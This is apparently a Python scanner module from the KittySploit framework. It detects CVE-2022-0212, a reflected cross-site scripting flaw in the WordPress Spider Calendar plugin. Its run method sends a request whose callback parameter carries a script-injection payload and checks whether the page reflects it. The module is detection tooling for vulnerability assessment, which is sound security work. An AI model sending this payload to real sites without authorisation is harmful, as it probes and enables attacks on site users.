#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WorsPress Spider Calendar plugin through 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Spider Calendar <=1.5.65 - Cross-Site Scripting Detection',
        'description': 'WorsPress Spider Calendar plugin through 1.5.65 is susceptible to cross-site scripting. The plugin does not sanitize and escape the callback parameter before outputting it back in the page via the window AJAX action, available to both unauthenticated and authenticated users. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': [
            'web',
            'scanner',
            'cve',
            'cve2022',
            'xss',
            'wpscan',
            'wordpress',
            'wp-plugin',
            'wp',
            'spider-event-calendar',
            'unauthenticated',
            '10web',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/15be2d2b-baa3-4845-82cf-3c351c695b47',
            'https://wordpress.org/plugins/spider-event-calendar/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-0212',
        ],
        'cve': 'CVE-2022-0212',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=window&callback=</script><img/src/onerror=alert(document.domain)>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('spider_Calendar_theme', '</script><img/src/onerror=alert(document.domain)>',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Spider Calendar <=1.5.65 - Cross-Site Scripting detected",
                path='/wp-admin/admin-ajax.php?action=window&callback=</script><img/src/onerror=alert(document.domain)>',
            )
            return True
        return False

